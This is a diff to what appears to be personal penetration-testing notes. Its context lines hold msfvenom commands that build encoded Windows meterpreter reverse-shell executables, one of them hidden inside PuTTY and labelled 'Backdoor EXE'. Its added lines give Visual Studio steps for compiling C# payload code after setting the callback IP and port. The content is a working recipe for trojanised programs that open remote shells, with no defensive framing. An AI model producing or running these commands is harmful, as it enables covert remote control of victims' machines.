@@ -12,6 +12,13 @@ Msfvenom
     msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=192.168.0.30 LPORT=8443 -o /home/scott/my-exploits/compiled/good_one.exe
     msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /root/putty.exe LHOST=192.168.0.14 LPORT=5555 > evilputty.exe  
     Backdoor EXE
+    
+Visual Studio Compiler
+  - New Project -> Console Application -> Name File
+  - Open program.cs (solution explorer on right panel)
+  - Paste *.cs code in top window and modify and callback IP and Ports
+  - Select Properties for the file and select the correct .Net version
+  - Build -> Build Solution
 
 Msfconsole
   Vim meterpreter.rc
